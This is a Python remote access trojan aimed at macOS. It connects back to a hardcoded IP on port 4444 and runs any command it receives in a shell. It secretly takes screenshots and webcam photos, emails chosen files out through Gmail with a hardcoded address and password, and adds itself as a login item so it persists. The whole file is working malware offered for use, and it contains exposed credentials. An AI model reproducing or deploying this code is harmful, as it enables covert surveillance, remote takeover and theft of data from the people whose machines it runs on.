import socket
import subprocess
import os
import platform
import smtplib
from email.MIMEMultipart import MIMEMultipart
from email.MIMEText import MIMEText
from email.MIMEBase import MIMEBase
from email import encoders
from PIL import ImageGrab
import time
import inspect
import string
from random import *
import random
import getpass
import webbrowser


def connect1():
	global username
	global s
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	time.sleep(4)
	try:
		s.connect(('10.80.123.127', 4444))
	except socket.error as msg:
		print("Connection Error: " + str(msg) + "\n" + "Retrying...")
		connect1()

def connect():
	global s
	global filename1
	global path
	o_s = platform.system()

	while True:
		global command
		command = s.recv(1024)


		if 'webcamcapture' in command:

        		cameraCapture()
        		time.sleep(3)
        		s.send("This image is saved as: " + randomFile1 + ".jpg" + "\n" + "At the Location: " + "/Users/" + username + "/Camera/" + randomFile1 + ".jpg")

		if 'getscreen' in command:

        		getscreen()
        		time.sleep(3)
        		s.send("This Screenshot is saved as: " + randomFile + ".png" + "\n" + "At the Location: " + "/Users/" + username + "/Screenshots/" + randomFile + ".png")


		if 'grab' in command:
				sendemail()
        	


		if 'terminate' in command:
			s.close()
			main()
	

		if command[:2].decode("utf-8") == 'cd' and command[3:].decode("utf-8") != '-' and '~' not in command:
			os.chdir(command[3:].decode("utf-8"))

		

		if len(command) > 0:
			CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			output_bytes = CMD.stdout.read() + CMD.stderr.read()
			output_string = str(output_bytes)
			s.send(str.encode(output_string + str(os.getcwd()) + '> '))
			


def sendemail():

	global name
	grab,name,path = command.split('*')
	fromaddr = "ktmorton17@gmail.com"
	toaddr = "ktmorton17@gmail.com"
 
	msg = MIMEMultipart()
 
	msg['From'] = fromaddr
	msg['To'] = toaddr
	msg['Subject'] = "File You Requested"
 
	body = "Here is your file:"
 
	msg.attach(MIMEText(body, 'plain'))
 
	filename = name
	attachment = open(str(path), "rb")
 
	part = MIMEBase('application', 'octet-stream')
	part.set_payload((attachment).read())
	encoders.encode_base64(part)
	part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
 
	msg.attach(part)
 
	server = smtplib.SMTP('smtp.gmail.com', 587)
	server.starttls()
	server.login(fromaddr, "Tennisrocks")
	text = msg.as_string()
	server.sendmail(fromaddr, toaddr, text)
	server.quit()

def getscreen():
	global randomFile
	global username
	username = getpass.getuser()
	if not os.path.exists("/Users/" + username + "/Screenshots"):
		os.makedirs("/Users/" + username + "/Screenshots")
	im = ImageGrab.grab()
	min_char = 8
	max_char = 12
	allchar = string.digits
	randomFile = "".join(choice(allchar) for x in range(randint(min_char, max_char)))
	im.save("/Users/" + username + "/Screenshots/" + randomFile + ".png")

def cameraCapture():
	global randomFile1
	global username
	username = getpass.getuser()
	ImageSnapDDir = "/Users/" + username + "/Downloads/ImageSnap-v0.2.5.tgz"
	ImageSnapDir ="/Users/" + username + "/ImageSnap-v0.2.5/imagesnap"
	if not os.path.exists(ImageSnapDDir):
		webbrowser.open('https://downloads.sourceforge.net/project/iharder/imagesnap/ImageSnap-v0.2.5.tgz?r=http%3A%2F%2Fiharder.sourceforge.net%2Fcurrent%2Fmacosx%2Fimagesnap%2F&ts=1491294950&use_mirror=superb-dca2') 
		time.sleep(4)
		os.system("""osascript -e 'tell application "System Events" to keystroke "m" using {option down, command down}' """)
		time.sleep(16)
		os.chdir("/Users/" + username)
		os.system("tar -xvzf /Users/kairotieremorton/Downloads/ImageSnap-v0.2.5.tgz")
	if not os.path.exists("/Users/" + username + "/Camera"):
		os.makedirs("/Users/" + username + "/Camera")
	min_char = 8
	max_char = 12
	allchar = string.digits
	randomFile1 = "".join(choice(allchar) for x in range(randint(min_char, max_char)))
	cameraDirectory = "/Users/" + username + "/Camera/" + randomFile1 + ".jpg"
	time.sleep(10)
	os.system(ImageSnapDir + " -w 1 " + cameraDirectory)


def main():
	connect1()
	connect()

o_s = platform.system()
if o_s == 'Darwin':
	filename1 = inspect.getfile(inspect.currentframe())
	os.system("""osascript -e 'tell application "System Events" to make login item at end with properties {path:""" + '"' + filename1 + '"' + """,hidden:false}' """)
main()




